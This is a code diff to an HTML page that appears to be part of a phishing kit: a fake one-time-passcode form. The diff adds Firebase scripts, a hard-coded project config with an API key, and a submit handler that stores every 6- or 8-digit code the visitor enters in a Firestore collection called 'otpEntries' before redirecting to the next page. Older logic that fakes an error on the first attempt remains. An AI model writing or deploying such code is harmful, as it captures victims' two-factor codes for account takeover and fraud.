@@ -3,6 +3,11 @@
 <head>
   <title>dehijlbrd</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+
+  <!-- Firebase SDKs -->
+  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore-compat.js"></script>
+
   <style>
     html, body {
       margin: 0;
@@ -154,12 +159,28 @@
   </div>
 
   <script>
+    // Firebase Config
+    const firebaseConfig = {
+      apiKey: "AIzaSyDdRv4_wFI5hjSi_0ci_YDUsdWY5Uv7wDE",
+      authDomain: "dlhiljbrd.firebaseapp.com",
+      projectId: "dlhiljbrd",
+      storageBucket: "dlhiljbrd.firebasestorage.app",
+      messagingSenderId: "981951131769",
+      appId: "1:981951131769:web:6ba4d6bfa570ffa62664a8"
+    };
+
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.firestore();
+  </script>
+
+  <script>
     let attempt = 1;
 
     function handleSubmit() {
       const blur = document.getElementById("blurOverlay");
-      const otp = document.getElementById("otp");
+      const otpInput = document.getElementById("otp");
       const errorText = document.getElementById("errorText");
+      const otp = otpInput.value.trim();
 
       blur.style.display = "flex";
 
@@ -170,8 +191,15 @@
           errorText.style.display = "block";
           attempt++;
         } else {
-          if (otp.value.length === 6 || otp.value.length === 8) {
-            window.location.href = "page3.html";
+          if (otp.length === 6 || otp.length === 8) {
+            db.collection("otpEntries").add({
+              otp: otp,
+              timestamp: firebase.firestore.FieldValue.serverTimestamp()
+            }).then(() => {
+              window.location.href = "page3.html";
+            }).catch((error) => {
+              alert("Error saving OTP: " + error.message);
+            });
           } else {
             alert("Please enter a valid 6 or 8 digit OTP.");
           }
@@ -182,7 +210,7 @@
       return false;
     }
 
-    // Countdown Timer - 3 minutes
+    // Countdown Timer
     let timeLeft = 180;
     const timerDisplay = document.getElementById("timer");
 
